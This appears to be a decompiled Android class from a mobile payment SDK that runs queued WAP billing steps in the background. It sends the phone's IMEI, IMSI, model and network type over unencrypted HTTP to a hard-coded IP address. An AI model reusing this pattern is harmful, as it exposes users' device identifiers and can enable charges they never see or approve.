package com.zhangzhifu.sdk.onlinegame;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Build.VERSION;
import com.zhangzhifu.sdk.db.MMQWapDBManager;
import com.zhangzhifu.sdk.db.SharePreferUtil;
import com.zhangzhifu.sdk.mmq.xpayagent.model.MMQJsonResponse;
import com.zhangzhifu.sdk.mmq.xpayagent.net.APIResource;
import com.zhangzhifu.sdk.modle.MMQProcedure;
import com.zhangzhifu.sdk.modle.MMQWap;
import com.zhangzhifu.sdk.util.JudgeTimeUtil;
import com.zhangzhifu.sdk.util.SystemInfo;
import com.zhangzhifu.sdk.util.ZhangPayLog;
import com.zhangzhifu.sdk.util.json.MsgResponse_MMQ;
import java.util.Calendar;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

public class ZhangPayMMQF
{
  public static final String LIVE_API_BASE = "http://120.132.66.225:8080/xpay/v1/charges";
  public static int allFlow;
  private static ZhangPayMMQF cm;
  public static String currentWapUrl;
  private String bA;
  private Context bZ;
  private MMQProcedure cn;
  private MsgResponse_MMQ co;
  public int count;
  private MMQJsonResponse cp;
  public boolean isSend = false;
  public boolean isSendNext = false;
  
  public ZhangPayMMQF(Context paramContext)
  {
    this.bZ = paramContext;
  }
  
  private static String a(Context paramContext, String paramString1, String paramString2, String paramString3, String paramString4, String paramString5)
  {
    String str1 = getOsModel();
    String str2 = getOsInfo();
    String str3 = getNetInfo(paramContext);
    long l = Calendar.getInstance().getTimeInMillis() / 1000L;
    com.zhangzhifu.sdk.mmq.xpayagent.WaterWest.apiKey = paramString1;
    HashMap localHashMap = new HashMap();
    localHashMap.put("amount", paramString2);
    localHashMap.put("order_no", paramString3);
    localHashMap.put("channel", paramString4);
    localHashMap.put("app_id", paramString5);
    paramString2 = new HashMap();
    paramString2.put("imei", SystemInfo.getIMEI(paramContext));
    paramString2.put("imsi", SystemInfo.getMTKDoubleSIMInfo(paramContext));
    paramString2.put("os_info", str2);
    paramString2.put("os_model", str1);
    paramString2.put("net_info", str3);
    paramString2.put("timestamp", String.valueOf(l));
    localHashMap.put("extra", paramString2);
    try
    {
      paramContext = APIResource.getResult("http://120.132.66.225:8080/xpay/v1/charges", localHashMap, paramString1);
      return paramContext;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return null;
  }
  
  public static ZhangPayMMQF getInstance(Context paramContext)
  {
    if (cm == null) {
      cm = new ZhangPayMMQF(paramContext);
    }
    return cm;
  }
  
  public static String getNetInfo(Context paramContext)
  {
    paramContext = ((ConnectivityManager)paramContext.getSystemService("connectivity")).getActiveNetworkInfo();
    if (paramContext == null) {
      paramContext = "";
    }
    String str;
    do
    {
      return paramContext;
      str = paramContext.getTypeName();
      if (str.compareTo("MOBILE") == 0) {
        break;
      }
      paramContext = str;
    } while (str.compareTo("mobile") != 0);
    return "GPRS";
  }
  
  public static String getOsInfo()
  {
    String str = Build.VERSION.RELEASE;
    if ((str != null) && (str.trim().length() > 0)) {
      return str;
    }
    return "";
  }
  
  public static String getOsModel()
  {
    String str = Build.MODEL;
    if ((str != null) && (str.trim().length() > 0)) {
      return str;
    }
    return "";
  }
  
  public void deelOnlineGameWap(List paramList)
  {
    if ((paramList != null) && (paramList.size() > 0)) {
      paramList = paramList.iterator();
    }
    for (;;)
    {
      if (!paramList.hasNext()) {
        return;
      }
      MMQWap localMMQWap = (MMQWap)paramList.next();
      if (!JudgeTimeUtil.isMax(2, this.bZ)) {
        break;
      }
      if (localMMQWap == null)
      {
        ZhangPayLog.d("zhangPay_log", "计费失败");
      }
      else if ((localMMQWap.getAllProcedure() != null) && (localMMQWap.getAllProcedure().size() != 0))
      {
        new c(this, localMMQWap).execute(new String[] { "" });
        MMQWapDBManager.getInstance().delWapById(this.bZ, localMMQWap);
      }
    }
    SharePreferUtil.getInstance().setSmsResult(this.bZ, 1005);
    ZhangPayLog.d("zhangPay_log", "该设备今日已超过可计费次数上限");
  }
}
